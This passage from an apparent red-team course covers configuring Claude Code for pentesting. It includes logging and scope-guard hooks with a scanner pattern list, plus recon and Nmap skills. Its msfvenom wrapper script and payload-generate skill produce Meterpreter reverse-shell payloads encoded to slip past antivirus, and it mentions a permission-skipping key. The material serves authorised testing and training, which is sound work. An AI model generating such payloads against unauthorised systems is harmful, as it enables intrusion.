          { "type": "command", "command": "mkdir -p ~/.claude/logs && jq -c '{ts: now, tool: .tool_name, input: .tool_input, result: (.tool_response | tostring | .[0:2000])}' >> ~/.claude/logs/tool-calls.jsonl" }
        ]
      }
    ],
    "Stop": [
      {
        "hooks": [
          { "type": "command", "command": "date '+turn end %F %T' >> ~/.claude/logs/audit.log" }
        ]
      }
    ]
  }
}
EOF
15.3 The scope-guard hook
mkdir -p ~/.claude/hooks
cat > ~/.claude/hooks/scope-guard.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

payload="$(cat)"
tool="$(jq -r '.tool_name' <<< "$payload")"
cmd="$(jq -r '.tool_input.command // ""' <<< "$payload")"

if [[ "$tool" != "Bash" ]]; then exit 0; fi
case "$cmd" in
  nmap*|masscan*|nikto*|gobuster*|ffuf*|whatweb*|sslscan*|httpx*)
    ;;
  *)
    exit 0
    ;;
esac

targets="$(grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}|[A-Za-z0-9.-]+\.[A-Za-z]{2,}' <<< "$cmd" || true)"

if [[ ! -f ./scope.txt ]]; then
  echo "no scope.txt in cwd — refusing scanner invocation" >&2
  exit 2
fi

for t in $targets; do
  if ! grep -qxF "$t" ./scope.txt; then
    echo "target $t not in ./scope.txt — refusing" >&2
    exit 2
  fi
done
exit 0
EOF
chmod +x ~/.claude/hooks/scope-guard.sh
15.4 A recon skill
mkdir -p ~/.claude/skills/web-recon
cat > ~/.claude/skills/web-recon/SKILL.md <<'EOF'
---
name: web-recon
description: |
  Use when the operator asks to recon a web target — enumerate subdomains,
  fingerprint the stack, discover endpoints, or produce a surface map.
  Not for exploitation.
allowed-tools: Bash, Read, Write, Grep, Glob
---

# Web recon workflow

## Prechecks
- Confirm ./scope.txt exists and the requested target appears in it.
- Ensure a ./recon directory exists; create if missing.

## Steps

1. Subdomains

subfinder -d $TARGET -silent | tee recon/subs.txt assetfinder --subs-only $TARGET | tee -a recon/subs.txt sort -u -o recon/subs.txt recon/subs.txt
2. Liveness

httpx -l recon/subs.txt -status-code -title -tech-detect -o recon/http.txt
3. URLs

gau $TARGET | tee recon/urls.txt waybackurls $TARGET | tee -a recon/urls.txt sort -u -o recon/urls.txt recon/urls.txt
4. Summary
Produce recon/summary.md with:
- count of live subdomains
- notable tech stacks
- three most promising leads

## Rules
- Never run anything intrusive from this skill.
- Never touch a host not in scope.txt.
EOF
15.5 A slash command for finding entry
mkdir -p ~/.claude/commands
cat > ~/.claude/commands/finding.md <<'EOF'
---
description: Append a new finding to ./report/findings.md
argument-hint: "<short-title>"
---
Ensure ./report/findings.md exists. Append this block, with the next ID:

## Finding: $ARGUMENTS
- ID: acme-NN
- Severity: TODO
- Affected: TODO
- Description: TODO
- Evidence: TODO
- Impact: TODO
- Remediation: TODO
- References: TODO

Fill in any of the TODOs you can infer from the current conversation.
EOF
15.6 Verify each piece
# 1. CLI is on PATH:
claude --version
# 2.4.1

# 2. Auth works:
claude --print "reply with the word ok"
# ok

# 3. Global CLAUDE.md is loaded:
claude --print "what directory do engagements live in?"
# /home/kali/engagements/ ...

# 4. Settings deny works:
claude --print "run: rm -rf /tmp/testfile"
# The runtime refuses the tool call.

# 5. Skill activates:
cd ~/engagements/lab-scratch
echo "example.com" > scope.txt
mkdir -p recon
claude --print "recon example.com per our web-recon workflow. Do not actually run scanners; describe what you would run."
# Response should mention subfinder, httpx, gau in the order the skill lays out.

# 6. Hook denies out-of-scope:
claude --print "run: nmap -sV 8.8.8.8"
# Hook fires; command refused with "target 8.8.8.8 not in ./scope.txt".

# 7. Slash command exists:
claude
> /help
# `finding` appears in the list.
> /finding sql-injection-on-login
# Finding block appended to ./report/findings.md.
15.7 Confirm the audit log
tail -n 5 ~/.claude/logs/audit.log
tail -n 5 ~/.claude/logs/tool-calls.jsonl | jq

You now have a runtime that logs everything, refuses destructive commands, refuses out-of-scope scans, and codifies a recon workflow as a skill and a report action as a slash command. That is the baseline every following lesson builds on.
16. Exercises
Guided

    Add a masscan allow rule. Extend ~/.claude/settings.json to allow Bash(masscan:*). Confirm the scope guard still refuses when the target is not in scope.txt. Confirm it allows when the target is in scope.txt.

    Write a PreCompact hook. Copy the full transcript to ~/.claude/logs/transcripts/<session-id>.jsonl before compaction so you never lose fidelity. Verify by producing a long session and triggering /compact.

    Build a cve-triage skill. Frontmatter description: "Use when the operator provides a CVE identifier and asks for triage." Body: fetch the NVD entry via WebFetch, extract CVSS, affected products, whether an exploit is public, and produce a five-line triage note. Test with CVE-2024-4577.

Independent

    Design a Notification hook. Send yourself a desktop notification (notify-send) whenever the model is waiting on your input. Justify the design — when do you want to be alerted, when do you not?

    Model routing policy. Write a PreToolUse hook that inspects the tool name and, if it is Task, forces the subagent's model to haiku. Justify why or why not, and measure the token savings on a fan-out recon session.

    Skill triage. Take three prompts you commonly retype at the start of a session and turn each into a skill. Test that all three fire on the appropriate prompts and none fires on the wrong prompt. If a skill mis-fires, rewrite its description until it does not.

17. Summary and Next Lesson

The Claude Code runtime is a decision loop wrapped around a model, with clean insertion points at every step: CLAUDE.md and skills shape the model's knowledge; permissions and hooks shape what it is allowed to do; slash commands package repeated prompts; MCP servers extend its tool set; subagents fan out or specialize; the reasoning tier picks the model that fits the task. On Kali 2026 you install it with one npm command and configure it with a settings.json, a CLAUDE.md, a couple of hooks, a skill, and a slash command — which is exactly what the full example in Section 15 walks you through.

In Lesson 02 we go one layer deeper: you will write your own MCP server in Rust, expose a bespoke recon tool to Claude Code as a first-class capability, and wire it into the runtime you configured in this lesson. If you have not run every command in Section 15 yet, do that before starting Lesson 02 — you will need the working baseline.














































Lesson 02 — Creating Custom Pentest Skills for Claude Code

    Module 06: Building Pentest Skills with Claude and Codex · Penetration Testing with Kali Linux 1.0 · Red Team Leaders

Introduction

A skill in Claude Code is a Markdown playbook — plus an optional folder of resource files — that Claude auto-loads into the conversation when the situation matches its description. Skills are how a red team encodes tradecraft into a form the agent can actually use during an engagement: a subdomain-enumeration routine, a port-scan decision tree, a msfvenom payload wrapper, a Nuclei-tuning workflow. When the trigger phrase or the surrounding context matches, the skill is pulled in without the operator typing anything special, and the steps it contains become part of the current plan.

This lesson walks through the anatomy of a skill from the outside in. First the directory layout, then the YAML frontmatter, then the body of the Markdown, then the resource files it can reference. After the mechanical parts are clear, we build three complete pentest skills from scratch — subdomain-enum, port-scan, and payload-generate — and finish with a full end-to-end nuclei-scan skill that we test in a lab, refine trigger phrasing on, and version-control.

By the end you will be able to sit down with any workflow you run by hand today, package it as a skill in under an hour, and have Claude Code invoke it correctly the next time the context calls for it. Skills are the reusable unit of red-team automation in Claude Code — treat them the same way a mature team treats internal tools: small, single-purpose, tested, and version-controlled.
1. What a Skill Is — A Markdown Playbook Claude Auto-Loads

A skill is one Markdown file called SKILL.md, optionally accompanied by supporting files in the same directory. That is the whole shape of it. The Markdown file describes what the skill does, when Claude should reach for it, and what steps to run. The supporting files — reference scripts, checklists, config templates, wordlists — are pulled in on demand from within the body.

Three things make skills different from a plain-text prompt sitting in a note file:

    Auto-invocation — Claude Code reads every available skill's description field at the start of a session. When a later user message or an intermediate reasoning step matches that description, the skill's body is loaded into the conversation without the user typing the skill name.
    Explicit invocation — the user can also call a skill directly by typing /<skill-name> in the terminal (or by asking Claude to "use the <name> skill"). This is the deterministic path — the skill is loaded whether or not the description matched.
    Scoping — skills live in three places: a user-global directory that applies to every project, a project-local directory that applies only in that repo, and plugin directories that ship a bundle of skills at once. Precedence runs project → user → plugin so a repo can override a global routine when it needs to.

A skill is not a tool in the MCP sense — it does not add a new function to Claude's tool list. It is a snippet of instructions that becomes part of the model's context when relevant. The tools it uses (Bash, Read, Write, WebFetch, the Task subagent tool, MCP tools) are the same ones already available to the session. What the skill contributes is the recipe, the flag choices, the decision points, and the "call this reference file at step 3" plumbing.

The mental model to hold: a skill is to Claude Code what a playbook is to a runbook operator. It is not a program. It is an authoritative document that says "when the situation looks like X, here is the procedure I want you to follow."
2. Skill Anatomy — Directory Layout and SKILL.md

Every skill is a directory whose name is the skill name and whose entry point is SKILL.md. The minimum viable skill is a single-file skill:
~/.claude/skills/
└── subdomain-enum/
    └── SKILL.md

A skill with resource files adds more entries to the same directory:
~/.claude/skills/
└── subdomain-enum/
    ├── SKILL.md
    ├── resolvers.txt
    ├── wordlists/
    │   ├── common.txt
    │   └── deep.txt
    ├── scripts/
    │   ├── merge.sh
    │   └── dedupe.py
    └── references/
        ├── flags.md
        └── troubleshooting.md

The rules that govern the directory:

    The directory name is the skill's public name. subdomain-enum becomes /subdomain-enum.
    SKILL.md must exist at the top of the directory. That is the file Claude reads.
    Every other file in the directory is a resource. Claude does not read them at load time — the body of SKILL.md decides when to read them.
    Subdirectories are allowed and encouraged for organization (scripts/, wordlists/, references/).
    Paths inside SKILL.md are relative to the skill's own directory. When you write Read scripts/merge.sh in the body, the agent resolves that against the skill's directory, not the project's working directory.

The SKILL.md file itself has two parts: a YAML frontmatter block at the very top, and a Markdown body below it. The frontmatter is delimited by --- fences and must be the first thing in the file. The body is regular Markdown and can contain headings, lists, fenced code, tables, and links — whatever Claude will read best.

Bare-minimum SKILL.md:
---
name: subdomain-enum
description: Enumerate subdomains for a given root domain using subfinder, resolve them with httpx, and hand off to nuclei for a quick vuln sweep. Use when the user names a scope like "*.example.com", asks to map a target's attack surface, or requests a subdomain list.
---

# subdomain-enum

## When to use
Any time the operator has a root domain and wants a live subdomain list plus
a first-pass vulnerability sweep. Do not run this against a domain that is
not in scope.

## Steps
1. Confirm the root domain with the operator. If it looks like a paid provider
   (e.g. `*.blob.core.windows.net`, `*.appspot.com`), warn and stop.
2. Run: `subfinder -d <root> -all -silent -o subs.txt`
3. Run: `httpx -l subs.txt -silent -title -status-code -tech-detect -o live.txt`
4. Run: `nuclei -l live.txt -severity medium,high,critical -o findings.txt`
5. Summarize findings by severity, group by host, and present to the operator.

That file, dropped into ~/.claude/skills/subdomain-enum/SKILL.md, is a complete, auto-invocable skill. The next sections unpack each part.
3. The Frontmatter Fields — What Each Does, When to Omit

The frontmatter is where Claude Code decides whether to surface your skill at all. Get this right and the rest is easy; get it wrong and the skill sits on disk unused.
3.1 name (required)

The skill's public identifier. Rules:

    Lowercase letters, digits, and hyphens only.
    Should match the directory name exactly.
    Should be short and memorable — you will type it as /name at the prompt.
    Should describe the action, not the tool: subdomain-enum beats subfinder-wrapper.

If name does not match the directory name, Claude Code prefers the directory name for invocation but may still surface the skill under the frontmatter's name. Keep them in sync to avoid confusion.
3.2 description (required)

The single most important field. This is the text Claude scans to decide whether to auto-invoke the skill. It is not documentation for humans — it is a trigger pattern for the model.

Write it as: what the skill does + when it should fire + a few keywords the user might say. See section 4 for the pattern.
3.3 tools (optional)

A list of tool names the skill is restricted to. If present, only these tools will be available to the model during that skill's execution.
tools:
  - Bash
  - Read
  - Write

Omit when the skill can use any tool the session has available. Include when the skill should be locked down — for example, a "recon-only" skill that must never call Write. In practice, most red-team skills omit tools because pentesters need everything at hand.
3.4 model (optional)

Pins the skill to a specific Claude model.
model: claude-opus-4-7

Use sparingly. A skill that pins a model breaks if that model is retired. Pin only when the skill does something (say, deep multi-step exploit reasoning) that a smaller model measurably fails at. For 90% of pentest skills, leave this unset.
3.5 allowed-tools and other newer fields

Some Claude Code versions add extra frontmatter keys (allowed-tools, dangerously-skip-permissions — this last one only ever inside plugin skills the user has vetted). These are version-specific. If you are writing skills for a team, stick to name, description, and optionally tools. Anything else risks portability.
3.6 A complete frontmatter
---
name: subdomain-enum
description: Enumerate subdomains for a root domain using subfinder, then probe live hosts with httpx and sweep for vulnerabilities with nuclei. Use when the operator names a wildcard scope like *.example.com, asks to map external attack surface, or requests a subdomain list.
tools:
  - Bash
  - Read
  - Write
---

That block is what every skill in this lesson starts with. Sections 9 through 12 build on it.
4. Writing an Effective Description — Trigger Phrasing

A skill fires when its description semantically matches the current situation. That means the description has to read like a lure the model recognizes when the user's language matches.
4.1 The three-part pattern

Every good pentest skill description contains three parts, in this order:

    What the skill does — one clause naming the action and the tools involved.
    When to use it — the trigger scenarios, phrased in the operator's own vocabulary.
    Keywords — extra nouns and verbs the operator might say that map to this skill.

Example, annotated:
Enumerate subdomains for a root domain using subfinder, then probe live
hosts with httpx and sweep for vulnerabilities with nuclei.
[what it does]

Use when the operator names a wildcard scope like *.example.com, asks to
map external attack surface, or requests a subdomain list.
[when to use it]

Handles: subdomain discovery, subfinder, httpx, nuclei, attack surface
management, external asset inventory, ASM.
[keywords]

That last "Handles:" line is optional but very effective — it gives the model direct term-to-skill mappings that improve auto-invocation on paraphrased requests.
4.2 Common description mistakes
Mistake	Bad Example	Better
Describes tool, not action	"Wraps subfinder"	"Enumerates subdomains using subfinder"
Missing trigger	"Runs a Nuclei scan"	"Runs a Nuclei scan when the operator asks to scan a URL list for CVEs"
Too narrow keywords	"For nuclei-scanning"	"vuln scan, cve check, template scan, nuclei"
Description longer than 500 chars	rambling paragraph	tight three-part block
4.3 Testing trigger phrasing

Write the description, then imagine three different ways the operator might phrase the request:

    Direct: "Enumerate subdomains for example.com"
    Paraphrase: "Map the external attack surface of example.com"
    Oblique: "What subs does example.com have?"

If the description contains vocabulary from all three, auto-invocation will work. If it only contains vocabulary from the direct phrasing, only that phrasing will fire it.
5. Writing an Effective Skill Body — Imperative Steps, Decision Trees

The frontmatter gets Claude to open the skill. The body is what happens next.
5.1 Structure the body with headings the model reads

Claude reads Markdown structurally. Use these standard sections and it will follow them:
## When to use
## Preconditions
## Steps
## Reference files
## Common pitfalls

    When to use — restatement of the trigger, in prose. Backs up the frontmatter.
    Preconditions — tools that must be installed, scope that must be confirmed.
    Steps — the actual procedure. Numbered. Imperative.
    Reference files — pointer to the resource files in the same directory.
    Common pitfalls — one-line notes about what breaks.

5.2 Imperative steps beat descriptive prose

Compare:

Bad — descriptive:

    The skill will call subfinder to gather subdomains. Then it should probably feed those into httpx to check which ones are live. After that, the operator might want to run nuclei.

Good — imperative:
## Steps
1. Ask the operator to confirm the root domain is in scope.
2. Run `subfinder -d <root> -all -silent -o subs.txt`.
3. Run `httpx -l subs.txt -silent -title -status-code -tech-detect -o live.txt`.
4. Run `nuclei -l live.txt -severity medium,high,critical -o findings.txt`.
5. Summarize findings grouped by severity and host.

The model executes imperative steps step-by-step. It negotiates descriptive prose.
5.3 Decision trees for branching logic

When the skill needs to branch, use an explicit decision tree the model can follow:
## Decision tree — TCP vs UDP vs SYN

If the operator asks for a "quiet" or "stealth" scan:
  Use `-sS` (SYN scan). Requires root.

If the operator names UDP services (DNS, SNMP, NTP):
  Use `-sU` on the top 100 UDP ports first.

If root is unavailable or the operator does not care about stealth:
  Use `-sT` (full connect scan).

If unsure: default to `-sS` on the top 1000 TCP ports.

The model treats each if line as a guard and picks the first branch that matches.
5.4 Linking to resource files

The body pulls in resource files by name, relative to the skill's directory:
## Reference files
- `flags.md` — full Nmap flag reference. Read this before writing any Nmap command.
- `scripts/parse.py` — parser for Nmap XML into a Markdown table. Use this to build the final report.
- `nse-safe.txt` — safe-category NSE scripts. Never load scripts outside this list without asking.

When Claude reaches step 3 of a procedure that says "consult flags.md before picking flags," it will Read flags.md from the skill directory. That is how you keep the top-level SKILL.md short while making thousands of lines of reference material available on demand.
6. Resource Files — Reference Scripts, Checklists, Config Templates

Resource files are the "load on demand" storage the skill body pulls from. They keep SKILL.md short (which is what the model always reads) while making detailed material available (which the model reads only when the skill needs it).
6.1 Typical resource file types
Kind	Filename convention	Purpose
Reference doc	references/*.md	Flag tables, protocol notes, cheat sheets
Executable script	scripts/*.sh or scripts/*.py	Shell/Python the skill invokes verbatim
Wordlist	wordlists/*.txt	Passed to fuzzers/enumerators as -w
Config template	templates/*.yaml or templates/*.conf	Rendered with values before use
Checklist	checklists/*.md	Pre/post-flight items the model should tick through
6.2 Reference doc — Nmap flag table

references/nmap-flags.md:
# Nmap flag reference

## Scan types
- `-sS` — SYN scan. Half-open. Requires root. Default for most cases.
- `-sT` — TCP connect scan. Completes the handshake. Works without root.
- `-sU` — UDP scan. Slow. Combine with `--top-ports 100`.
- `-sN`, `-sF`, `-sX` — Null, FIN, Xmas. Firewall evasion. Rarely needed.

## Timing
- `-T0` — paranoid. 5 min between probes. Only for extreme stealth.
- `-T3` — normal. Default.
- `-T4` — aggressive. Safe on LAN targets.

## Version and script scans
- `-sV` — service version detection.
- `-sC` — run default (safe) NSE scripts.
- `-A` — aggressive. Combines `-sV -sC -O --traceroute`.

When SKILL.md says "Consult references/nmap-flags.md before choosing timing," the model will read that file and pick flags accurately.
6.3 Script resource — msfvenom wrapper

scripts/gen-reverse.sh:
#!/usr/bin/env bash
set -euo pipefail

LHOST="${1:?Usage: gen-reverse.sh <LHOST> <LPORT> <PAYLOAD> <OUTFILE>}"
LPORT="${2:?}"
PAYLOAD="${3:?}"
OUTFILE="${4:?}"

msfvenom \
  -p "${PAYLOAD}" \
  LHOST="${LHOST}" \
  LPORT="${LPORT}" \
  -f exe \
  -e x86/shikata_ga_nai -i 6 \
  -o "${OUTFILE}"

The skill body says "Run scripts/gen-reverse.sh <lhost> <lport> <payload> <outfile>," and the model runs it. Keeping the msfvenom command inside a script means the flag choices are versioned with the skill.
6.4 Checklist resource — pre-flight

checklists/preflight.md:
# Pre-flight — external recon

Before running any active tool, tick each item:

- [ ] Scope document read and root domain confirmed
- [ ] Wildcard scope not a paid provider (blob.core, s3, appspot)
- [ ] Rate-limit expectation confirmed with operator
- [ ] Output directory created under `./recon/<target>/`
- [ ] Kill switch: operator has your Ctrl+C plan

The skill body says "Load checklists/preflight.md and confirm each item before step 1." The model will read the file, present it to the operator, and wait for confirmation.
7. Testing a Skill — Three Invocation Paths

Once the skill is written, test it three ways before considering it shipped.
7.1 Invoke by name — the deterministic path

Type the skill name at the prompt:
> /subdomain-enum

Or ask directly:
> Use the subdomain-enum skill on example.com.

Claude Code should load SKILL.md and execute step 1 immediately. If the skill does not fire on this direct invocation, the file is not being discovered. Check:

    Is SKILL.md capitalized exactly? (Case matters on Linux.)
    Is the file inside a directory whose name matches the skill name?
    Is the directory under ~/.claude/skills/ or the project's .claude/skills/?
    Does the frontmatter parse as valid YAML? A missing --- closer breaks the file.

7.2 Invoke by trigger phrase — the description test

Rephrase the request in three ways and watch for auto-invocation:
> Enumerate subs for example.com                       (direct)
> Map external attack surface for example.com          (paraphrase)
> What subdomains does example.com expose?             (oblique)

For each, Claude Code should recognize the situation and open SKILL.md automatically. If only the direct phrasing fires it, your description is too narrow — add keywords.
7.3 Observe passive loading — the context test

Start a session about a broader task and see if the skill loads on its own:
> I've been given example.com as an external target with wildcard scope.
> Help me plan the first day of the engagement.

If the skill is well-scoped, it should load partway through the planning conversation, when the model reaches "external enumeration." If it does not load, the description is not linking to the surrounding vocabulary of the pentest workflow.
7.4 Debugging with --verbose

Run Claude Code with verbose logging to see which skills the model considered:
claude --verbose

Verbose mode logs "considered skill X — description matched Y." That output shows exactly which trigger keywords fired and which did not, which is the fastest way to tune the description.
8. Skill Scoping — Global, Project, Plugin

Three directories house skills, and their precedence matters.
8.1 Global — ~/.claude/skills/

Applies to every project on your machine. Best for skills that are truly universal to your work: recon routines, payload wrappers, PoC templates.
~/.claude/skills/
├── subdomain-enum/
├── port-scan/
├── payload-generate/
└── nuclei-scan/

Any Claude Code session on the machine, in any repo, sees these skills.
8.2 Project — .claude/skills/ inside a repo

Applies only to sessions running in that repo. Best for engagement-specific skills:
~/engagements/acme-2026-q1/
├── .claude/
│   └── skills/
│       ├── acme-login-flow/
│       ├── acme-jwt-decoder/
│       └── acme-cve-triage/
├── scope.md
└── notes/

Project skills override global skills of the same name. That is deliberate — a per-engagement nuclei-scan skill can pin a specific template set for that client while your global nuclei-scan stays broad.
8.3 Plugin — distributed as part of a Claude Code plugin

Plugins can ship skill directories. When installed, those skills become available at global scope but never overwrite user-authored global skills of the same name.
~/.claude/plugins/red-team-kit/
└── skills/
    ├── recon-web/
    ├── recon-api/
    └── recon-cloud/

Precedence, top wins:

    Project .claude/skills/<name>/
    User global ~/.claude/skills/<name>/
    Plugin ~/.claude/plugins/<pkg>/skills/<name>/

When a name collides across scopes, the higher scope's skill loads and the lower ones are ignored.
8.4 Which scope for which skill
Skill type	Scope	Why
subdomain-enum (generic recon)	Global	You use it on every engagement
acme-login-flow (client-specific)	Project	Only useful for that repo
web-recon-bundle (team's shared kit)	Plugin	Distributed to the whole team
9. Building Your First Pentest Skill — subdomain-enum

Now we build the first real skill end to end.
9.1 The problem

Every external engagement starts with subdomain enumeration. The workflow is stable — subfinder for discovery, httpx for liveness and metadata, nuclei for a first vuln sweep — but the flags, output paths, and severity filters vary. This is the perfect skill candidate: repeated, mechanical, and worth encoding.
9.2 Directory layout
~/.claude/skills/subdomain-enum/
├── SKILL.md
├── references/
│   └── flags.md
└── scripts/
    └── merge-sources.sh
9.3 Complete SKILL.md
---
name: subdomain-enum
description: Enumerate subdomains for a root domain using subfinder, probe live hosts with httpx, and sweep for medium+ vulnerabilities with nuclei. Use when the operator names a wildcard scope like *.example.com, asks to map external attack surface, requests a subdomain list, or asks about ASM/EASM. Handles subdomain discovery, subfinder, httpx, nuclei, attack surface, asset inventory.
tools:
  - Bash
  - Read
  - Write
---

# subdomain-enum

## When to use
The operator has a root domain in scope and wants a live subdomain list plus a
first-pass vulnerability sweep. Runs three stages: discovery, liveness+meta,
vuln sweep.

## Preconditions
- `subfinder`, `httpx`, and `nuclei` installed and on PATH.
- Operator has confirmed the root domain is in scope. Wildcard scope only
  covers what the scope document says it covers.
- Output directory `./recon/<root>/` will be created if missing.

## Steps

1. Ask the operator: "Confirm root domain and that `*.<root>` is in scope."
   Wait for confirmation. If the operator names a paid-provider wildcard
   (`*.blob.core.windows.net`, `*.appspot.com`, `*.s3.amazonaws.com`), refuse
   and explain the scope issue.

2. Create the output directory:
   `mkdir -p ./recon/<root>/`

3. Run passive discovery:
   `subfinder -d <root> -all -silent -o ./recon/<root>/subs.txt`

   `-all` enables every configured source. `-silent` suppresses banner
   output so the file contains only hostnames.

4. Optional: augment with `assetfinder` if installed:
   `assetfinder --subs-only <root> >> ./recon/<root>/subs.txt`
   Then dedupe with `scripts/merge-sources.sh`.

5. Probe liveness and gather metadata:
   `httpx -l ./recon/<root>/subs.txt -silent -title -status-code -tech-detect -o ./recon/<root>/live.txt`

   Flags mean: silent output, page title, HTTP status, tech stack fingerprint.

6. First-pass vuln sweep:
   `nuclei -l ./recon/<root>/live.txt -severity medium,high,critical -o ./recon/<root>/findings.txt`

   Never run `-severity info,low` on a first pass — the noise-to-signal ratio
   is unacceptable. Escalate to lower severity only after triage.

7. Present findings grouped by severity, then by host. For each host list
   status, tech stack, and any nuclei hits. Ask the operator which host to
   deep-dive next.

## Reference files
- `references/flags.md` — flag reference for subfinder, httpx, nuclei.
- `scripts/merge-sources.sh` — merges and dedupes multiple discovery sources.

## Common pitfalls
- Running `nuclei` before `httpx` — you will scan dead hosts and waste time.
- Forgetting `-severity` — full-severity scans generate thousands of info-level
  hits that drown real findings.
- Scope creep — subfinder returns third-party CNAMEs (CDN, mail hosts) that
  are not in scope. Filter before scanning.
9.4 The referenced flags file

references/flags.md:
# subfinder / httpx / nuclei flag reference

## subfinder
- `-d <domain>` — target root.
- `-dL <file>` — list of roots.
- `-all` — every configured source (needs API keys for full coverage).
- `-silent` — no banner. Output is hostnames only.
- `-o <file>` — output file.
- `-recursive` — recurse discovered subs. Expensive.

## httpx
- `-l <file>` — input list.
- `-silent` — no banner.
- `-title` — page title.
- `-status-code` — HTTP status.
- `-tech-detect` — tech stack via Wappalyzer signatures.
- `-follow-redirects` — follow 3xx.
- `-threads 50` — concurrency. Default 50 is safe.

## nuclei
- `-l <file>` — input list.
- `-severity medium,high,critical` — filter by severity.
- `-t <template-dir>` — restrict template set.
- `-etags network,dns` — exclude noisy template groups.
- `-c 25` — concurrency (default). Do not exceed 50 without operator OK.
- `-rate-limit 150` — global rate limit.
9.5 The merge script

scripts/merge-sources.sh:
#!/usr/bin/env bash
set -euo pipefail

ROOT="${1:?Usage: merge-sources.sh <root-domain>}"
OUT="./recon/${ROOT}/subs.txt"

# Combine subfinder, assetfinder, and any *.txt in the sources subdir
cat ./recon/${ROOT}/sources/*.txt 2>/dev/null | \
  awk '{print tolower($0)}' | \
  sort -u | \
  grep -E "\\.${ROOT}\$" > "${OUT}.tmp"

mv "${OUT}.tmp" "${OUT}"
wc -l "${OUT}"

Everything a first-pass subdomain enumeration needs is now encoded, versioned, and auto-invocable.
10. Building port-scan — Nmap with a Decision Tree

The next skill wraps Nmap. Nmap's flag surface is huge; the value the skill adds is picking the right flags for the situation without the operator having to remember.
10.1 Directory layout
~/.claude/skills/port-scan/
├── SKILL.md
└── references/
    ├── nmap-flags.md
    └── nse-safe.txt
10.2 Complete SKILL.md
---
name: port-scan
description: Run Nmap against a target host or CIDR, choosing scan type (SYN, connect, UDP) based on privilege and stealth requirements. Use when the operator asks to port-scan, service-scan, or enumerate open ports on a host or subnet. Handles nmap, port scan, service detection, TCP scan, UDP scan, SYN scan, host discovery.
tools:
  - Bash
  - Read
  - Write
---

# port-scan

## When to use
The operator names a host, an IP, or a CIDR and asks for port or service
information. This skill picks scan flags for the situation and produces both
a machine-readable and human-readable report.

## Preconditions
- `nmap` installed.
- Target confirmed in scope.
- Operator has stated whether stealth matters. If unclear, ask.
- Root privilege available for SYN scans (`sudo -n true` succeeds).

## Decision tree — scan type

If the operator says "stealth", "quiet", "avoid IDS", or "half-open":
  Use `-sS` (SYN scan). Requires root.

If the operator names UDP services (DNS, SNMP, NTP, IKE, TFTP):
  Use `-sU --top-ports 100` first. Follow with a targeted UDP scan on
  specific ports the operator names.

If root is unavailable OR the operator does not care about stealth:
  Use `-sT` (full TCP connect). No privilege required.

If the operator asks for "everything":
  Combine: `-sS -sU --top-ports 100` in one command (Nmap runs both).

Default when unsure: `-sS` on top 1000 TCP ports.

## Decision tree — port range

If the operator names specific ports: use `-p <list>`.
If the operator says "full scan" or "all ports": use `-p-` (1-65535).
If the operator says "fast" or "top": use `--top-ports 1000` (default).
Default: `--top-ports 1000`.

## Decision tree — service detection

Always include `-sV` unless the operator says "just open ports, no versions."
Include `-sC` (default scripts) when the operator wants "enum" or "recon."
Include `-O` (OS detection) only when specifically asked — it is noisy.

## Steps

1. Read `references/nmap-flags.md` for the current flag catalogue.
2. Confirm target(s) with the operator. For CIDRs larger than /24, warn about
   scan duration.
3. Pick flags using the decision trees above. State the chosen command back
   to the operator and wait for OK.
4. Create output directory:
   `mkdir -p ./scans/<target>/`
5. Run the scan with all three output formats:
   `nmap <flags> -oA ./scans/<target>/scan <target>`
   `-oA` writes `scan.nmap`, `scan.xml`, and `scan.gnmap` at once.
6. Parse the `.gnmap` for open ports and present a summary table:
   `| Host | Port | Proto | State | Service | Version |`
7. Ask the operator which service to enumerate deeper. Common next steps:
   HTTP → nikto/nuclei; SMB → enum4linux; SSH → banner grab.

## Reference files
- `references/nmap-flags.md` — full flag catalogue.
- `references/nse-safe.txt` — list of NSE scripts considered safe to run.

## Common pitfalls
- Running `-p-` on a /24 with `-T3` — hours of scan time. Warn the operator
  and offer a top-ports fallback.
- Missing `sudo` on `-sS` — Nmap silently falls back to `-sT`. Check for
  root before choosing SYN.
- Trusting `-sV` version output blindly — banners can lie. Always verify
  before pivoting to an exploit.
10.3 Referenced NSE safe-list

references/nse-safe.txt:
# Safe-category NSE scripts. Any script outside this list requires operator OK.
banner
dns-brute
ftp-anon
http-title
http-headers
http-methods
http-robots.txt
ssl-cert
ssl-enum-ciphers
smb-os-discovery
smb-security-mode
ssh-hostkey
ssh2-enum-algos

Now port-scan is a single invocation and Claude picks the right flag set without the operator having to think.
11. Building payload-generate — msfvenom with Target Selection

Payload generation is repetitive and error-prone by hand. This skill wraps msfvenom with target OS/arch selection and encoding options.
11.1 Directory layout
~/.claude/skills/payload-generate/
├── SKILL.md
├── references/
│   ├── payload-matrix.md
│   └── encoders.md
└── scripts/
    ├── gen-windows.sh
    ├── gen-linux.sh
    └── gen-web.sh
11.2 Complete SKILL.md
---
name: payload-generate
description: Generate reverse-shell or bind-shell payloads with msfvenom, choosing the right payload and encoder for the target OS, architecture, and delivery format. Use when the operator asks for a shellcode, reverse shell, bind shell, payload, or msfvenom command. Handles msfvenom, payload generation, reverse shell, bind shell, meterpreter, encoding, shikata_ga_nai, staged vs stageless.
tools:
  - Bash
  - Read
  - Write
---

# payload-generate

## When to use
The operator has a foothold plan and needs a payload binary, script, or
executable. This skill picks payload name, encoder, and output format from
target OS/arch/delivery.

## Preconditions
- `msfvenom` installed (part of Metasploit Framework).
- Operator has provided LHOST and LPORT.
- Operator has stated target OS, arch, and delivery method (exe, elf, php, war, aspx).
- Handler is either already running or will be started before delivery.

## Decision tree — payload

If target is Windows x64 and delivery is an exe:
  `windows/x64/meterpreter/reverse_tcp` (staged) OR
  `windows/x64/meterpreter_reverse_tcp` (stageless).

If target is Windows x86 and delivery is an exe:
  `windows/meterpreter/reverse_tcp`.

If target is Linux x64 and delivery is an elf:
  `linux/x64/meterpreter/reverse_tcp`.

If delivery is web (PHP, ASPX, JSP):
  `php/meterpreter/reverse_tcp`,
  `windows/x64/meterpreter/reverse_tcp` via ASPX,
  `java/jsp_shell_reverse_tcp` for JSP.

If target has strict egress and only 443 is out:
  Use `reverse_https` variants.

## Decision tree — staged vs stageless

If the target has AV/EDR and payload size is not constrained:
  Prefer stageless. Fewer network callbacks, less signature surface.

If size matters (e.g. buffer overflow shellcode):
  Prefer staged. Smaller initial payload.

Default: stageless when file-based delivery, staged when memory-based.

## Decision tree — encoding

If the target has signature-based AV and you cannot use a custom loader:
  Encode with `-e x86/shikata_ga_nai -i 6` (six iterations).

If the target is x64 Windows:
